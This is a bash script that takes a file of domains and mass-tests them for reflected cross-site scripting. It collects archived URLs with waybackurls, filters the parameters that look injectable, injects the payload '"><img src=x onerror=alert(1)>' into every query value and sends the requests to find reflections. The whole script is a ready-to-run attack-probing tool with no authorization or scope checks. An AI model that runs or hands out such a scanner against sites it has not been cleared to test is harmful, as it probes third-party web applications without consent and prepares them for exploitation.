#!/bin/bash

# Function to display help
show_help() {
    echo "Usage: $0 [-l domains.txt] [-h]"
    echo ""
    echo "Options:"
    echo "  -l FILE    Specify the file containing domains (default: domains.txt)"
    echo "  -h         Show this help message"
}

# Default file
file="domains.txt"

# Parse command-line options
while getopts ":l:h" opt; do
    case ${opt} in
        l )
            file=$OPTARG
            ;;
        h )
            show_help
            exit 0
            ;;
        \? )
            echo "Invalid option: -$OPTARG" >&2
            show_help
            exit 1
            ;;
        : )
            echo "Option -$OPTARG requires an argument." >&2
            show_help
            exit 1
            ;;
    esac
done

# Check if file exists
if [[ ! -f "$file" ]]; then
    echo "Error: File '$file' not found."
    exit 1
fi

# Process each domain in the file
while IFS= read -r domain; do
    echo "$domain" | waybackurls | urldedupe -s -qs-ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
done < "$file"
